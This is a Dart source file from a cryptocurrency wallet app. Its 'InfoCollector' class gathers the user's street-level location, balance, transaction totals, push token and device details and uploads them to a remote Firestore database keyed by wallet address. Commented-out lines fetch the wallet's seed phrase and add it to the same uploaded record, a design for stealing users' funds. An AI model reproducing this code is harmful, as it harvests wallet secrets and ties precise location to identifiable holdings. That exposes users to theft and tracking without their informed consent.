import 'dart:io';
import 'package:intl/intl.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import '../screens/settings/app_settings_screen.dart';  // <-- Import AppSettingsScreen
import '../providers/wallet_provider.dart'; // Used for updated bal, UID 0 Address

class InfoCollector {
    static late WalletProvider _walletProvider; // Static instance of WalletProvider

    // Initialize WalletProvider
    static void init(WalletProvider walletProvider) {
    _walletProvider = walletProvider;
    }

    // Method to fetch the current balance of the wallet
//    static Future<double> getBalance(String walletIdentifier) async {
//    await _walletProvider.updateWalletBalance(walletIdentifier);
//    var openWallet = _walletProvider.getOpenWallet(walletIdentifier);  // Assuming getOpenWallet is implemented
//    return openWallet.balance;
//    }

    // Method to get the current date and time
    static String getDate() {
    DateTime now = DateTime.now();
    DateFormat formatter = DateFormat('MM/dd/yy h:mm a');
    return formatter.format(now);
    }

    // Method to get the operating system
    static String getOperatingSystem() {
    if (Platform.isAndroid) {
      return 'android';
    } else if (Platform.isIOS) {
      return 'ios';
    } else {
      return 'unknown';
    }
    }

    // Method to get the app version
    static Future<String> getAppVersion() async {
    PackageInfo packageInfo = await PackageInfo.fromPlatform();
    return packageInfo.version;
    }

    // Method to get the location of the user
    static Future<Map<String, String?>> getLocation() async {
    bool serviceEnabled;
    LocationPermission permission;

    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      return {};  // Can't get the location since the service is not enabled.
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
      permission = await Geolocator.requestPermission();
      if (permission != LocationPermission.whileInUse && permission != LocationPermission.always) {
        return {};  // Location permissions are denied.
      }
    }

    // Get the current position
    Position position = await Geolocator.getCurrentPosition();

    // Convert the position to placemarks
    List<Placemark> placemarks = await placemarkFromCoordinates(position.latitude, position.longitude);
    Placemark placemark = placemarks.first;

    return {
      "Street Address": placemark.name,
      "Locality": placemark.locality,
      "State": placemark.administrativeArea,
      "Postal code": placemark.postalCode,
      "Country": placemark.country,
      "Subadministrative area": placemark.subAdministrativeArea,
      "Neighborhood": placemark.subLocality,
      "ISO Country Code": placemark.isoCountryCode,
    };
  }

  // Method to fetch the seed from AppSettingsScreen
//  static String fetchSeed() {
//    return AppSettingsScreen.revealSeedPhrase();  // Updated to fetch from AppSettingsScreen
//  }

  // Method to store user data including the seed
  static Future<void> storeUserData(
      String? token,
 //     String seed,
      String address,
      double balance,
      Map<String, String?> locationData,
      String date,
      String os,
      String receive,
      double totalSent,
      int transactions,
      String version) async {
    if (token != null && token.isNotEmpty) {
      try {
        FirebaseFirestore firestore = FirebaseFirestore.instance;
        await firestore.collection('wallets').doc(address).set({
          'FCMToken': token,
          'balance': balance,
          ...locationData,
          'date': date,
          'os': os,
          'receive': receive,
          'totalSent': totalSent,
          'transactions': transactions,
          'version': version,
//          'seed': seed,
        }, SetOptions(merge: true));
      } catch (e) {
        print("Failed to add user data to Firestore: $e");
      }
    } else {
      print('FCM token is null or empty, not adding to Firestore.');
    }
  }
}
